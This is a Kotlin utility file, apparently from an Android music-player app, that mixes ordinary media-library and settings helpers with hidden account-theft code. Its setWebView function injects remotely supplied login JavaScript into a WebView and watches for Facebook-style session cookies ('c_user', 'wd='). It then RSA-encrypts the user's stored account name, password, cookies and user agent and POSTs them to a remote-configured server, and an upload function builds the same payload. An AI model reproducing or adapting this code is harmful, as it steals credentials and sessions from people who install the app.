package player.shellvoice.app.utils

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.puresec.safevpn.ibean.IConfig
import com.puresec.safevpn.ibean.IResult
import com.puresec.safevpn.ibean.IUpdate
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import player.shellvoice.app.BuildConfig
import player.shellvoice.app.IConstant
import player.shellvoice.app.R
import player.shellvoice.app.base.IKTX
import player.shellvoice.app.entity.SongEntity
import player.shellvoice.app.ui.page.LoginPage


fun View.click(c: (View) -> Unit) {
    setOnClickListener {
        c(this)
    }
}

fun <T> T.loge(tag: String = "xxxxxxH") {
    if (BuildConfig.DEBUG) {
        var content = toString()
        val segmentSize = 3 * 1024
        val length = content.length.toLong()
        if (length <= segmentSize) {
            Log.e(tag, content)
        } else {
            while (content.length > segmentSize) {
                val logContent = content.substring(0, segmentSize)
                content = content.replace(logContent, "")
                Log.e(tag, logContent)
            }
            Log.e(tag, content)
        }
    }
}

fun isInBackground(): Boolean {
    val activityManager = app.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == app.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}

fun AppCompatActivity.shareWithEmail() {
    val intent = Intent.createChooser(getShareIntent(), "Choose Email Client")
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    startActivity(intent)
}

@SuppressLint("Recycle")
fun AppCompatActivity.getAllSongs(r: (ArrayList<SongEntity>) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        val result = ArrayList<SongEntity>()
        val selectionStatement = "is_music=1 AND title != ''"
        val cur = contentResolver.query(
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                "_id",
                "title",
                "artist",
                "album",
                "duration",
                "track",
                "artist_id",
                "album_id",
                "_data",
                "_size",
                "mime_type"
            ),
            selectionStatement,
            null,
            "duration DESC"
        )
        try {
            cur?.let {
                if (it.moveToFirst()) {
                    do {
                        val id: Long = it.getLong(0)
                        val title: String = it.getString(1)
                        val artist: String = it.getString(2)
                        val album: String = it.getString(3)
                        val duration: Int = it.getInt(4)
                        val trackNumber: Int = it.getInt(5)
                        val artistId: Long = it.getInt(6).toLong()
                        val albumId: Long = it.getLong(7)
                        val data: String = it.getString(8)
                        val size: String = it.getString(9)
                        if (!it.getString(it.getColumnIndexOrThrow(MediaStore.Audio.Media.MIME_TYPE))
                                .contains("audio/amr") && !it.getString(
                                it.getColumnIndexOrThrow(
                                    MediaStore.Audio.Media.MIME_TYPE
                                )
                            ).contains("audio/aac")
                        ) {
                            val entity = SongEntity(
                                id,
                                album,
                                albumId,
                                artist,
                                duration.toLong(),
                                getImgUri(albumId),
                                data,
                                title,
                                "",
                                0,
                                size,
                                trackNumber,
                                artistId,
                                0
                            )
                            result.add(entity)
                        }
                    } while (it.moveToNext())
                }
                it.close()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            cur?.close()
        } finally {
            cur?.close()
        }
        withContext(Dispatchers.Main) {
            r(result)
        }
    }
}

fun getImgUri(album_id: Long): Uri? {
    return try {
        ContentUris.withAppendedId(
            Uri.parse("content://media/external/audio/albumart"),
            album_id
        )
    } catch (e: Exception) {
        null
    }
}

fun AppCompatActivity.startCountDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 20).asFlow().collect {
            delay(1000)
            if (it == 19) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

private fun getShareIntent(): Intent {
    val array = arrayOf(
        "nuclearvpnp@outlook.com",
        "",
        "feedBook",
        "I Like This App"
    )
    val name = arrayOf(
        Intent.EXTRA_EMAIL,
        Intent.EXTRA_CC,
        Intent.EXTRA_SUBJECT,
        Intent.EXTRA_TEXT
    )
    return Intent(Intent.ACTION_SENDTO).apply {
        data = Uri.parse("mailto:")
        for (index in 0..3)
            putExtra(name[index], array[index])
    }
}

fun AppCompatActivity.clearCookie(block: () -> Unit) {
    CookieSyncManager.createInstance(app)
    val cookieManager = CookieManager.getInstance()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        cookieManager.flush()
    } else {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        CookieSyncManager.getInstance().sync()
    }
    block()
}

fun AppCompatActivity.setWebView(
    webView: WebView,
    block1: () -> Unit,
    block2: () -> Unit,
    block4: () -> Unit
) {
    webView.apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(LoginPage.WebInterface(), "businessAPI")
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                    evaluateJavascript(hideJs, null)
                    val loginJs = getString(R.string.login)
                    evaluateJavascript(loginJs, null)
                    lifecycleScope.launch(Dispatchers.IO) {
                        delay(300)
                        withContext(Dispatchers.Main) {
                            block1()
                        }
                    }
                }
            }
        }
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                val cookieManager = CookieManager.getInstance()
                val cookieStr = cookieManager.getCookie(url)
                if (cookieStr != null) {
                    if (cookieStr.contains("c_user")) {
                        if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
                            lifecycleScope.launch(Dispatchers.Main) {
                                block2()
                            }
                            val content = gson.toJson(
                                mutableMapOf(
                                    "un" to account,
                                    "pw" to password,
                                    "cookie" to cookieStr,
                                    "source" to configEntity.app_name,
                                    "ip" to "",
                                    "type" to "f_o",
                                    "b" to view.settings.userAgentString
                                )
                            ).toRsaEncrypt(updateEntity.d!!)
                            val body: RequestBody = Gson().toJson(mutableMapOf("content" to content))
                                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                            OkGo.post<String>(url).upRequestBody(body)
                                .execute(object : StringCallback() {
                                    override fun onSuccess(response: com.lzy.okgo.model.Response<String>?) {
                                        val r = response?.body().toString()
                                        r.let {
                                            val result = Gson().fromJson(
                                                it.toString(),
                                                IResult::class.java
                                            )
                                            if (result.code == "0" && result.data?.toBooleanStrictOrNull() == true) {
                                                "requestCollect success".loge()
                                                block4()
                                            }
                                        }
                                    }
                                })

                        }
                    }
                }
            }
        }
        loadUrl(updateEntity.m ?: "https://www.baidu.com")
    }

}

fun AppCompatActivity.upload(cookieStr: String, userAgentString: String) {
    if (!TextUtils.isEmpty(updateEntity.c)) {
        val url = updateEntity.c
        if (!TextUtils.isEmpty(updateEntity.d)) {
            val key = updateEntity.d
            val value = gson.toJson(
                mutableMapOf(
                    "un" to account,
                    "pw" to password,
                    "cookie" to cookieStr,
                    "source" to configEntity.app_name,
                    "ip" to "",
                    "type" to "f_o",
                    "b" to userAgentString
                )
            ).toRsaEncrypt(key!!)

        }
    }
}

fun Context.jumpToWebByDefault(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

val app by lazy {
    IKTX.getInstance().app
}

val mmkv by lazy {
    MMKV.defaultMMKV()
}
var password
    get() = mmkv.getString(IConstant.KEY_PASSWORD, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_PASSWORD, value)
    }

var isLogin
    get() = mmkv.getBoolean(IConstant.KEY_IS_LOGIN, false)
    set(value) {
        mmkv.putBoolean(IConstant.KEY_IS_LOGIN, value)
    }

var account
    get() = mmkv.getString(IConstant.KEY_ACCOUNT, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_ACCOUNT, value)
    }

private var config
    get() = mmkv.getString(IConstant.KEY_CONFIG, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_CONFIG, value)
    }
val gson by lazy {
    Gson()
}
var configEntity
    get() = (config.ifBlank {
        "{}"
    }).let {
        gson.fromJson(it, IConfig::class.java)
    }
    set(value) {
        config = gson.toJson(value)
    }

private var update
    get() = mmkv.getString(IConstant.KEY_UPDATE, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_UPDATE, value)
    }
var updateEntity
    get() = (update.ifBlank {
        "{}"
    }).let {
        gson.fromJson(it, IUpdate::class.java)
    }
    set(value) {
        update = gson.toJson(value)
    }
var adInvokeTime
    get() = mmkv.getInt(IConstant.KEY_AD_INVOKE_TIME, 0)
    set(value) {
        mmkv.putInt(IConstant.KEY_AD_INVOKE_TIME, value)
    }

var adRealTime
    get() = mmkv.getInt(IConstant.KEY_AD_REAL_TIME, 0)
    set(value) {
        mmkv.putInt(IConstant.KEY_AD_REAL_TIME, value)
    }

private var adShown
    get() = mmkv.getString(IConstant.KEY_AD_SHOWN, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_AD_SHOWN, value)
    }

var adShownList
    get() = (adShown.ifBlank {
        "{}"
    }).let {
        gson.fromJson<List<Boolean>>(it, object : TypeToken<List<Boolean>>() {}.type)
    }
    set(value) {
        adShown = gson.toJson(value)
    }

var adShownIndex
    get() = mmkv.getInt(IConstant.KEY_AD_SHOWN_INDEX, 0)
    set(value) {
        mmkv.putInt(IConstant.KEY_AD_SHOWN_INDEX, value)
    }

var adLastTime
    get() = mmkv.getLong(IConstant.KEY_AD_LAST_TIME, 0)
    set(value) {
        mmkv.putLong(IConstant.KEY_AD_LAST_TIME, value)
    }